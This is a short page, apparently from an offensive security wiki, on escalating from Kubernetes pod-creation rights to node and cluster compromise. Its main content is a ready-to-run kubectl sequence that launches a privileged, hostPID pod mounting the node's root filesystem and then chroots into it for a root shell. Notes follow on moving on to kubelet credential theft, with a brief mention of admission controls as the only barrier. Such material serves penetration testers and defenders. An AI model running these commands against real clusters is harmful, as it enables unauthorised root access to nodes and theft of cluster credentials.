---
title: "Pod creation to node: turning pod creation into cluster compromise"
description: "Escalating in Kubernetes from the right to create pods to node and cluster compromise, by scheduling a pod that mounts the host filesystem, runs privileged, or shares host namespaces, then using it to steal node credentials and reach the whole cluster."
keywords:
  - create pods
  - privileged pod
  - hostPath
  - node compromise
  - kubernetes escalation
---

# Pod creation to node

The right to create pods is one of the most powerful permissions in Kubernetes, because a pod spec can request a host mount, the privileged flag, or host namespaces. Scheduling such a pod lands code on a node as root, where the kubelet credentials and other pods' secrets lead to the whole cluster.

```bash
kubectl auth can-i create pods
# Schedule a pod that mounts the node root filesystem
kubectl run pwn --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/host"}],"command":["sleep","1d"]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'
kubectl exec -it pwn -- chroot /host sh
```

## Exploitation notes

- `create pods` plus a permissive or absent Pod Security admission is node compromise; the pod requests the dangerous configuration directly.
- Even namespaced pod-creation reaches the node it schedules onto, then [Kubelet credential theft](../pod-escape-to-node/kubelet-credential-theft.md) widens it to the cluster.
- The breakout inside the pod uses [Privileged configuration](../../../container-escape/privileged-configuration/index.md); admission controls are the only thing standing in the way, so check them first.

## References

- [Kubernetes: Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Kubernetes: pods](https://kubernetes.io/docs/concepts/workloads/pods/)
